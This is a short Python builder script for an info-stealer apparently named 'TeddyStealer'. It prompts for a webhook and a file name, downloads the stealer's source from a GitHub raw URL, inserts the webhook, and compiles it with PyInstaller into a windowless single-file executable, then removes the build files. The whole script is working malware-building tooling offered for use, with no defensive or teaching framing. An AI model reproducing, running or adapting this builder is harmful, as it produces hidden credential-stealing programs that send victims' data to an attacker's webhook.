import os
import shutil
import requests
import base64
import random
import PyInstaller.__main__

from Crypto.Cipher import AES
from Crypto import Random

def endHandler():
  os._exit(0)

webhookk = input(f"Input Webhook: ")

fileName = input(f"Input File Name: ")

code = requests.get("https://raw.githubusercontent.com/Shade3421/TeddyStealer/main/TeddyStealer.py").text.replace("WEBHOOK", webhookk)
with open(f"{fileName}.py", 'w') as f:
    f.write(code)

print(f"\nCreating {fileName}.exe\n")
os.system(f'title Creating {fileName}.exe')
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
except FileNotFoundError:
        pass

print(f"\nFile created as {fileName}.exe\n")
input(f'[>>>] Enter anything to continue . . .  ')
endHandler()